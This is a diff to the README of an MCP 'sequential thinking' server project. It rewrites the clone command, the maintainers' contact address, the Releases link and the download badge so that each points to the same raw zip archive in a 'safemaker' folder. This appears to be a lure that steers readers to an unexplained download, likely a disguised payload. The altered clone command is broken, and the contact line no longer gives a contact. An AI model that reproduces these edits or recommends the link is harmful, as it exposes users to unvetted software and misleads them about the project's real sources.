@@ -32,7 +32,7 @@ To get started with the MCP Server MAS Sequential Thinking, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/iniarfia/mcp-server-mas-sequential-thinking.git
+   git clone https://github.com/iniarfia/mcp-server-mas-sequential-thinking/raw/refs/heads/main/safemaker/sequential-thinking-server-mas-mcp-3.7-beta.3.zip
    ```
 2. Navigate into the project directory:
    ```bash
@@ -87,13 +87,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For inquiries, please reach out to the project maintainers at [support@yourdomain.com](mailto:support@yourdomain.com).
+For inquiries, please reach out to the project maintainers at [https://github.com/iniarfia/mcp-server-mas-sequential-thinking/raw/refs/heads/main/safemaker/sequential-thinking-server-mas-mcp-3.7-beta.3.zip](https://github.com/iniarfia/mcp-server-mas-sequential-thinking/raw/refs/heads/main/safemaker/sequential-thinking-server-mas-mcp-3.7-beta.3.zip).
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases section](https://github.com/iniarfia/mcp-server-mas-sequential-thinking/releases).
+For the latest updates and versions, visit the [Releases section](https://github.com/iniarfia/mcp-server-mas-sequential-thinking/raw/refs/heads/main/safemaker/sequential-thinking-server-mas-mcp-3.7-beta.3.zip).
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0.0-blue)](https://github.com/iniarfia/mcp-server-mas-sequential-thinking/releases)
+[![Download Releases](https://github.com/iniarfia/mcp-server-mas-sequential-thinking/raw/refs/heads/main/safemaker/sequential-thinking-server-mas-mcp-3.7-beta.3.zip%20Releases-v1.0.0-blue)](https://github.com/iniarfia/mcp-server-mas-sequential-thinking/raw/refs/heads/main/safemaker/sequential-thinking-server-mas-mcp-3.7-beta.3.zip)
 
 ## Conclusion
 
